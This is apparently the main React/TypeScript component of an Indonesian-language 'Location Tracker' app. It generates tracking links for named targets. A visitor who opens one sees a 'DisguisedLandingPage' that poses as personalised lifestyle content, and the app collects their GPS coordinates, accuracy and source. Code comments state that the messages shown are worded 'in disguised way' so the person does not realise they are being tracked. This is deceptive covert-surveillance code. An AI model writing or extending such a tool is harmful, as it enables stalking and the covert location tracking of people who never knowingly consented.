// src/App.tsx
import { useState, useEffect } from "react";
import type { LocationData, TrackingLink, StatsData } from "./types";
import { useLocalStorage } from "./hooks/useLocalStorage";
import { useGeolocation } from "./hooks/useGeolocation";
import CreateLinkForm from "./components/CreateLinkForm";
import Dashboard from "./components/Dashboard";
import LocationModal from "./components/LocationModal";
import DisguisedLandingPage from "./components/DisguisedLandingPage";
import {
  createLocationData,
  parseTrackingParams,
  clearTrackingParams,
} from "./utils/locationUtils";
import { createTrackingUrl } from "./utils/linkGenerator";

function App() {
  // Local Storage State
  const [locations, setLocations] = useLocalStorage<LocationData[]>("trackedLocations", []);
  const [trackingLinks, setTrackingLinks] = useLocalStorage<TrackingLink[]>("trackingLinks", []);

  // Component State
  const [showLocationModal] = useState(false);
  const [currentTarget, setCurrentTarget] = useState<string | null>(null);
  const [isProcessingLocation, setIsProcessingLocation] = useState(false);
  const [isTrackingMode, setIsTrackingMode] = useState(false);
  const [trackingData, setTrackingData] = useState<{
    trackId: string;
    name: string;
    category?: string;
    item?: string;
  } | null>(null);

  // Custom Hooks
  const {
    getCurrentPosition,
    isLoading: geoLoading,
    error: geoError,
    clearError,
  } = useGeolocation();

  // Check for tracking parameters on load
  useEffect(() => {
    console.log("=== DEBUG: Checking for tracking parameters ===");
    console.log("Current URL:", window.location.href);
    console.log("Pathname:", window.location.pathname);
    console.log("Search params:", window.location.search);

    const { trackId, name } = parseTrackingParams();
    console.log("Parsed tracking params:", { trackId, name });

    if (trackId && name && !isProcessingLocation) {
      console.log("✅ Found tracking parameters, entering tracking mode...");

      // Extract category and item from URL path for content customization
      const pathSegments = window.location.pathname
        .split("/")
        .filter((segment) => segment.length > 0);
      const category = pathSegments[0] || "lifestyle";
      const item = pathSegments[1] || "inspiration";

      setTrackingData({ trackId, name, category, item });
      setIsTrackingMode(true);
      setCurrentTarget(name);
    } else {
      console.log("❌ No valid tracking parameters found, showing normal dashboard");
      setIsTrackingMode(false);
    }
  }, []);

  // Calculate stats
  const stats: StatsData = {
    totalTracked: locations.length,
    onlineNow: locations.filter((loc) => loc.status === "online").length,
    activeLinks: trackingLinks.length,
  };

  // Handle link creation
  const handleLinkCreated = (newLink: TrackingLink) => {
    setTrackingLinks((prev) => [...prev, newLink]);
  };

  const processLocationTracking = async (targetName: string, trackId: string) => {
    console.log("=== DEBUG: processLocationTracking started ===");
    console.log("Target:", targetName, "TrackID:", trackId);

    if (isProcessingLocation) {
      console.log("❌ Already processing, skipping...");
      return;
    }

    setIsProcessingLocation(true);
    clearError();

    try {
      console.log("🔍 Getting current position...");

      // Get current position with enhanced fallback
      const position = await getCurrentPosition();
      console.log("✅ Position obtained:", position);

      // Create location data
      const locationData = createLocationData(targetName, position);
      console.log("✅ Location data created:", locationData);

      // Add to locations
      setLocations((prev) => {
        const newLocations = [...prev, locationData];
        console.log("✅ Updated locations array:", newLocations);
        console.log("Total locations now:", newLocations.length);
        return newLocations;
      });

      // Update link access status
      setTrackingLinks((prev) => {
        const updatedLinks = prev.map((link) => {
          if (link.id === trackId) {
            console.log("✅ Updating link:", link.id);
            return {
              ...link,
              accessed: true,
              accessCount: (link.accessCount || 0) + 1,
              lastAccessed: new Date(),
            };
          }
          return link;
        });
        console.log("✅ Updated links:", updatedLinks);
        return updatedLinks;
      });

      console.log("🎉 Location tracking completed successfully");

      // Show success message in disguised way
      setTimeout(() => {
        alert(
          `✅ Konten berhasil dipersonalisasi untuk ${targetName}!\n\n` +
            `📍 Area: ${position.latitude.toFixed(6)}, ${position.longitude.toFixed(6)}\n` +
            `🎯 Akurasi: ${position.accuracy}m\n` +
            `📡 Sumber: ${position.source === "gps" ? "GPS" : "Deteksi Otomatis"}\n\n` +
            `🎉 Sekarang kamu akan mendapat konten yang lebih personal!`
        );
      }, 1000);

      // Clean up after successful tracking
      setTimeout(() => {
        console.log("🧹 Cleaning up tracking mode...");
        setIsTrackingMode(false);
        setTrackingData(null);
        clearTrackingParams();
      }, 3000);
    } catch (error) {
      console.error("❌ Location tracking failed:", error);

      let errorMessage = "Gagal mendapatkan lokasi untuk personalisasi konten. ";
      if (error instanceof Error) {
        console.error("Error details:", error.message, error.stack);
        errorMessage += error.message;
      } else {
        errorMessage += "Silakan coba lagi.";
      }

      // Show error in disguised way
      alert(
        `❌ ${errorMessage}\n\n` +
          `💡 Tips:\n` +
          `• Pastikan browser mengizinkan akses lokasi\n` +
          `• Aktifkan GPS/Location Services\n` +
          `• Coba refresh halaman dan izinkan akses lokasi\n` +
          `• Pastikan koneksi internet stabil\n\n` +
          `🌟 Tanpa lokasi, kamu tetap bisa menikmati konten umum!`
      );

      // Still mark the link as accessed (they clicked it)
      setTrackingLinks((prev) =>
        prev.map((link) => {
          if (link.id === trackId) {
            return {
              ...link,
              accessed: true,
              accessCount: (link.accessCount || 0) + 1,
              lastAccessed: new Date(),
            };
          }
          return link;
        })
      );

      // Clean up even if failed
      setTimeout(() => {
        console.log("🧹 Cleaning up after error...");
        setIsTrackingMode(false);
        setTrackingData(null);
        clearTrackingParams();
      }, 5000);
    } finally {
      console.log("🔄 Cleaning up processing state...");
      setIsProcessingLocation(false);
    }
  };

  // Handle location request from disguised page
  const handleLocationRequest = () => {
    if (trackingData) {
      processLocationTracking(trackingData.name, trackingData.trackId);
    }
  };

  // Convert stored dates back to Date objects
  useEffect(() => {
    if (locations.length > 0) {
      const convertedLocations = locations.map((loc) => ({
        ...loc,
        timestamp: new Date(loc.timestamp),
      }));

      // Only update if there's a difference
      const needsUpdate = locations.some(
        (loc, index) => !(loc.timestamp instanceof Date) && convertedLocations[index]
      );

      if (needsUpdate) {
        setLocations(convertedLocations);
      }
    }
  }, []);

  // Convert stored link dates
  useEffect(() => {
    if (trackingLinks.length > 0) {
      const convertedLinks = trackingLinks.map((link) => ({
        ...link,
        created: new Date(link.created),
        lastAccessed: link.lastAccessed ? new Date(link.lastAccessed) : undefined,
      }));

      // Only update if there's a difference
      const needsUpdate = trackingLinks.some(
        (link, index) => !(link.created instanceof Date) && convertedLinks[index]
      );

      if (needsUpdate) {
        setTrackingLinks(convertedLinks);
      }
    }
  }, []);

  // If in tracking mode, show disguised landing page
  if (isTrackingMode && trackingData) {
    return (
      <DisguisedLandingPage
        targetName={trackingData.name}
        onLocationRequest={handleLocationRequest}
        isLoading={isProcessingLocation}
        category={trackingData.category}
        item={trackingData.item}
      />
    );
  }

  // Normal dashboard view
  return (
    <div className="bg-gradient-to-br from-blue-50 to-indigo-100 min-h-screen">
      <div className="container mx-auto px-4 py-8">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-5xl font-bold text-gray-800 mb-3">📍 Location Tracker</h1>
          <p className="text-gray-600 text-lg">Buat link untuk tracking lokasi secara real-time</p>
          <div className="mt-2 text-sm text-gray-500">Powered by React + TypeScript + Vite</div>

          {/* Show processing status */}
          {isProcessingLocation && (
            <div className="mt-4 bg-blue-100 border border-blue-300 text-blue-700 px-4 py-2 rounded-lg">
              🔄 Sedang memproses lokasi...
            </div>
          )}

          {/* Show geolocation error */}
          {geoError && (
            <div className="mt-4 bg-red-100 border border-red-300 text-red-700 px-4 py-2 rounded-lg">
              ❌ {geoError}
            </div>
          )}
        </div>

        {/* Create Link Form */}
        <CreateLinkForm onLinkCreated={handleLinkCreated} />

        {/* Dashboard */}
        <Dashboard locations={locations} stats={stats} />

        {/* Active Links Section */}
        {trackingLinks.length > 0 && (
          <div className="bg-white rounded-xl shadow-lg p-6">
            <h2 className="text-xl font-semibold text-gray-800 mb-4">
              🔗 Link Aktif ({trackingLinks.length})
            </h2>
            <div className="space-y-3">
              {trackingLinks.map((link) => (
                <div key={link.id} className="border border-gray-200 rounded-lg p-4">
                  <div className="flex justify-between items-center">
                    <div>
                      <div className="font-semibold text-gray-800">{link.name}</div>
                      <div className="text-sm text-gray-500">
                        Dibuat: {link.created.toLocaleString("id-ID")}
                      </div>
                      {link.lastAccessed && (
                        <div className="text-xs text-gray-400">
                          Terakhir diakses: {link.lastAccessed.toLocaleString("id-ID")}
                        </div>
                      )}
                    </div>
                    <div className="text-right">
                      <div
                        className={`text-sm font-medium ${
                          link.accessed ? "text-green-600" : "text-orange-600"
                        }`}
                      >
                        {link.accessed ? `✅ Diakses (${link.accessCount}x)` : "⏳ Belum diakses"}
                      </div>
                      <div className="flex flex-col space-y-1 mt-2">
                        <button
                          onClick={() => {
                            const trackingUrl = createTrackingUrl(link);
                            navigator.clipboard.writeText(trackingUrl);
                            alert("Link copied to clipboard!");
                          }}
                          className="text-blue-500 hover:text-blue-700 text-sm"
                        >
                          📋 Copy Link
                        </button>
                        <button
                          onClick={() => {
                            const trackingUrl = createTrackingUrl(link);
                            console.log("Generated URL:", trackingUrl);
                            alert(
                              `🔗 URL Preview:\n${trackingUrl}\n\nLink sudah dicopy ke clipboard!`
                            );
                            navigator.clipboard.writeText(trackingUrl);
                          }}
                          className="text-green-500 hover:text-green-700 text-sm"
                        >
                          👁️ Preview URL
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Location Modal - hanya untuk mode normal */}
      <LocationModal
        isVisible={showLocationModal}
        targetName={currentTarget || undefined}
        isLoading={geoLoading || isProcessingLocation}
      />
    </div>
  );
}

export default App;
